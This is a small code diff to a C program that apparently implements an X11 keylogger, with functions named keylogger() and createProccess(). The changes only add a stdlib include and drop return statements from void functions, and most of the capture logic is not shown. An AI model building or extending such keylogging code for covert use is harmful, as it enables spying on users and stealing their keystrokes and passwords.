@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdarg.h>
 #include <time.h>
+#include <stdlib.h>
 #include <string.h>
 #include "buffer.h"
 
@@ -32,7 +33,6 @@ void handleArgs(int argc, char* argv[]) {
             }
             else {
                 printf("Not good.");
-                return -1;
             }
         }
     }
@@ -93,7 +93,6 @@ void keylogger() {
 
     if (display == NULL) {
         printf("Error: XOpenDisplay");
-        return -1;
     }
 
     int logging = 0;
@@ -182,7 +181,6 @@ void keylogger() {
         memcpy(keyboardStateOld, keyboardState, 32);
     }
     XCloseDisplay(display);
-    return 0;
 }
 
 void createProccess() {
